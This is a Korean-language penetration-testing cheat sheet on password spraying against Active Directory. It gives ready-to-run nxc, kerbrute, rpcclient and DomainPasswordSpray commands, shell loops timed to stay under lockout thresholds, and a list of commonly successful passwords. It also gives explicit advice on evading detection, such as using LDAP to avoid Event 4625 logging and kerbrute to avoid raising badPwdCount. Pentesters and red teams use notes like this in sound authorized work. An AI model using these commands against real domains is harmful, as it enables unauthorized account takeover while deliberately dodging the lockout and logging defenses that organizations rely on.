# 03_패스워드스프레이

# AD 외부침투 — 패스워드 스프레이

락아웃 정책 반드시 먼저 확인. 임계값보다 항상 1~2회 적게 시도한다.

---

## 개념

패스워드 스프레이는 하나의 패스워드(또는 소수의 패스워드)를 다수의 계정에 시도하는 방식이다. 단일 계정에 많은 패스워드를 시도하는 브루트포스와 반대 방향이며, 락아웃 임계값 이하로 유지하면서 광범위하게 퍼뜨리기 때문에 기본적인 탐지 메커니즘을 우회할 수 있다.

실패해도 badPwdCount 카운터는 계정마다 독립적으로 동작하고, lockoutObservationWindow(일반적으로 30분) 내에 임계값에 도달하면 잠긴다. 따라서 한 번의 라운드 후 반드시 observationWindow 이상 대기해야 한다. 예를 들어 임계값이 5이면 4번만 시도하고 30분 이상 기다린 뒤 다시 시도한다.

중요한 점은 PDC Emulator에서 badPwdCount가 가장 정확하게 집계된다는 것이다. 다른 DC에서는 stale한 값을 가질 수 있어 실제보다 낮게 보일 수 있다. PDC에서 확인하는 것이 가장 안전하다.

또한 Fine-Grained Password Policy(FGPP, PSO)가 적용된 환경에서는 특정 그룹에 더 엄격한 정책이 적용될 수 있다. 이를 확인하지 않고 스프레이하면 FGPP 대상 계정이 잠길 수 있으므로 반드시 먼저 확인해야 한다.

---

## 락아웃 정책 확인

스프레이 전 가장 먼저 해야 하는 단계다. lockoutThreshold가 0이면 무제한, 3~5이면 간격을 두고 시도해야 한다. lockoutObservationWindow가 카운터 리셋까지의 시간이고, lockoutDuration이 잠금 해제까지의 시간이다.

```bash
# 익명으로 패스워드 정책 확인
nxc smb <DC_IP> -u '' -p '' --pass-pol

# 자격증명으로
nxc smb <DC_IP> -u john -p 'Password1!' --pass-pol

# enum4linux로
enum4linux-ng -P <DC_IP>
enum4linux-ng -P <DC_IP> -u john -p 'Password1!'

# rpcclient로
rpcclient -U "" -N <DC_IP> -c "getdompwinfo"

# LDAP으로 badpwdcount 현황 확인 (임계값 근접 계정 파악)
nxc ldap <DC_IP> -u john -p 'Password1!' --users
# → badpwdcount 컬럼 확인, 임계값-1 이상인 계정 목록에서 제거

# Windows (도메인 내부) — 기본 정책
net accounts /domain

# Fine-Grained Password Policy 확인 (자격증명 필요)
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADFineGrainedPasswordPolicySubject <PSO_NAME>

# PSO 적용 대상 계정 확인 후 스프레이 목록에서 제거
Get-ADUser -Filter * -Properties msDS-ResultantPSO | `
  Where-Object {$_.'msDS-ResultantPSO' -ne $null} | `
  Select-Object samaccountname, 'msDS-ResultantPSO'
```

## kerbrute (가장 안전 — badPwdCount 올라가지 않음)

kerbrute는 Kerberos 사전 인증 과정을 통해 패스워드를 검증하기 때문에 SMB/LDAP 스프레이와 달리 실패해도 badPwdCount가 증가하지 않는다. 락아웃 위험이 전혀 없어서 락아웃 정책이 엄격한 환경에서 최우선으로 사용해야 한다.

단, 실패는 Event ID 4771로 기록되며, 성공은 Event ID 4768로 기록된다. 고속 시도는 탐지될 수 있으므로 스레드 수를 조절한다.

```bash
# 단일 패스워드 스프레이
kerbrute passwordspray \
  -d corp.local \
  --dc <DC_IP> \
  valid_users.txt 'Spring2025!'

# 대소문자 변형 패스워드
kerbrute passwordspray \
  -d corp.local \
  --dc <DC_IP> \
  valid_users.txt 'spring2025!'

# 스레드 수 조절 (기본 10)
kerbrute passwordspray \
  -d corp.local \
  --dc <DC_IP> \
  --threads 5 \
  valid_users.txt 'Spring2025!'

# 여러 패스워드 — observationWindow 이상 대기하며 순차 시도
for pass in 'Spring2025!' 'Summer2025!' 'Welcome1' 'Password123'; do
  echo "[*] Trying:$pass"
  kerbrute passwordspray -d corp.local --dc <DC_IP> users.txt "$pass"
  echo "[*] Waiting 30 minutes..."
  sleep 1800
done
```

## nxc

nxc 스프레이는 SMB, LDAP, WinRM 등 다양한 프로토콜로 시도할 수 있다. LDAP으로 시도하면 SMB와 달리 Event ID 4625가 기록되지 않아 탐지 회피에 유리하지만, 여전히 badPwdCount는 올라간다.

- `-no-bruteforce`는 유저/패스워드 리스트를 1:1 매핑(조합 아님)으로 시도하는 옵션이다. 유저당 하나씩만 시도할 때 필수다. `-continue-on-success`는 성공 계정이 발견되어도 나머지를 계속 시도한다.

```bash
# SMB 스프레이 — 가장 기본
nxc smb <DC_IP> \
  -u users.txt \
  -p 'Spring2025!' \
  --continue-on-success \
  --no-bruteforce

# LDAP 스프레이 — 탐지 회피 (4625 이벤트 미발생)
nxc ldap <DC_IP> \
  -u users.txt \
  -p 'Spring2025!' \
  --continue-on-success

# WinRM 스프레이 (WinRM 열려있는 환경)
nxc winrm <DC_IP> \
  -u users.txt \
  -p 'Spring2025!' \
  --continue-on-success

# 여러 패스워드 — 유저:패스 1:1 매핑
nxc smb <DC_IP> \
  -u users.txt \
  -p passwords.txt \
  --no-bruteforce \
  --continue-on-success

# 유저명을 패스워드로 시도 (흔한 설정)
while IFS= read -r user; do
  nxc smb <DC_IP> -u "$user" -p "$user" --no-bruteforce 2>/dev/null | grep "+"
done < users.txt
```

## rpcclient (간단한 수동 검증)

rpcclient로 스프레이하면 성공 시 `Authority Name`이 출력된다. 소수의 계정을 검증할 때 간단히 쓸 수 있다.

```bash
# 단일 패스워드로 전체 유저 순회
for u in $(cat users.txt); do
  result=$(rpcclient -U "$u%Spring2025!" -c "getusername;quit" <DC_IP> 2>/dev/null)
  if echo "$result" | grep -q "Authority"; then
    echo "[+] SUCCESS:$u : Spring2025!"
  fi
done
```

## DomainPasswordSpray (Windows / 도메인 내부)

도메인에 참여한 머신에서 실행하면 AD에서 자동으로 유저 목록을 가져온다. Fine-Grained Password Policy를 자동으로 인식하고, 잠금 임계값에 1회 여유를 두고 시도한다. 도메인 내부에서 가장 안전하게 스프레이할 수 있는 방법이다.

```powershell
Import-Module .\DomainPasswordSpray.ps1

# 자동으로 도메인 유저 열거 후 스프레이
Invoke-DomainPasswordSpray `
  -Password 'Spring2025!' `
  -OutFile spray_results.txt

# 유저 목록 지정
Invoke-DomainPasswordSpray `
  -UserList users.txt `
  -Password 'Spring2025!' `
  -OutFile spray_results.txt

# 여러 패스워드
Invoke-DomainPasswordSpray `
  -PasswordList passwords.txt `
  -OutFile spray_results.txt

# 유저명을 패스워드로 시도
Invoke-DomainPasswordSpray `
  -UsernameAsPassword `
  -OutFile spray_results.txt
```

## 흔한 스프레이 패스워드 패턴

계절+연도, 회사명/도메인명+숫자/기호 조합이 실전에서 자주 성공한다. pwdLastSet 날짜를 알 수 있으면 패스워드가 바뀐 시기를 기반으로 추측할 수 있다. 또한 username을 그대로 패스워드로 쓰거나, 사용자 이름을 대문자+숫자로 변형한 패턴도 흔하다.

```
계절+연도:   Spring2025!  Summer2025!  Fall2025!  Winter2025!
            Spring2024!  Summer2024!  ...
환영 패턴:   Welcome1     Welcome123   Welcome@123  Welcome!
일반 패턴:   P@ssw0rd     Password1!   Password123  Pass@123
도메인 기반: Corp2025!    Company1!    <도메인명>2025!
유저명 기반: <username>   <username>1  <Username>!
```

## 흐름

패스워드 정책 확인 (락아웃 임계값, observationWindow) → badpwdcount 높은 계정 목록에서 제거 → FGPP 적용 계정 파악 및 제거 → kerbrute로 먼저 시도 (badPwdCount 안 올라감) → 막히면 nxc LDAP으로 시도 → 임계값-1회 시도 후 observationWindow 이상 대기 → 성공 계정으로 다음 단계 이동
